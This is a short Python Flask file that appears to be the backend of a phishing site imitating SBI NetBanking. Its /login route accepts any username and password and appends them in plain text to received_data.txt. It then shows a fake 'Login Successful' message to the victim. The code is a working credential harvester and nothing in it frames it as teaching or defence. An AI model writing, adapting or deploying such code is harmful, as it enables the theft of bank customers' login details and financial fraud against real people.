
from flask import Flask, request, redirect, render_template_string
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    with open("index.html", "r") as f:
        return f.read()

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Save the data to a file
    with open("received_data.txt", "a") as file:
        file.write(f"{datetime.now()} - Username: {username}, Password: {password}\n")

    return '''
    <h2 style="text-align:center; color:green;">Login Successful</h2>
    <p style="text-align:center;">Thank you for using SBI NetBanking.</p>
    '''

if __name__ == '__main__':
    app.run(debug=True)